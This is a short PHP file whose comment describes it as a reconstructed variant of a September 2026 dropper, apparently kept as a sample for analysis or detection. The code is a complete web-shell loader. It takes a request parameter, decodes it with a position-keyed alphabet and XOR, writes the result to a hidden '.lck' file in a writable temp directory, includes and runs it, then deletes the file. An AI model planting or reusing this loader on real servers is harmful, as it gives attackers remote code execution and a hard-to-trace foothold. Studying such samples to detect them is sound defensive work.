<?php
/* Reconstruction of a 2026-09 dropper build with the two
   details a new build could change: the decoder alphabet reordered and the
   <!--tag--> prelude dropped. Reads its one key through a variable, from
   $_REQUEST. Stored as .txt; never executed. */
$value = "chunk";
if (@$_REQUEST[$value] !== null) {
    $data = array_filter([session_save_path(), "/var/tmp", getenv("TMP"), ini_get("upload_tmp_dir"), "/dev/shm", sys_get_temp_dir()]);
    $parts = explode('.', $_REQUEST[$value]);
    $out = '';
    $s = '0123456789abcdefghijklmnopqrstuvwxyz';
    foreach ($parts as $i => $v) {
        $out .= chr(((int) $v - ord($s[$i % 36]) - ($i % 10)) ^ 41);
    }
    foreach ($data as $dir) {
        if (is_dir($dir) && is_writable($dir)) {
            $rec = sprintf("%s/.lck", $dir);
            if (file_put_contents($rec, $out)) {
                include $rec;
                @unlink($rec);
                exit;
            }
        }
    }
}
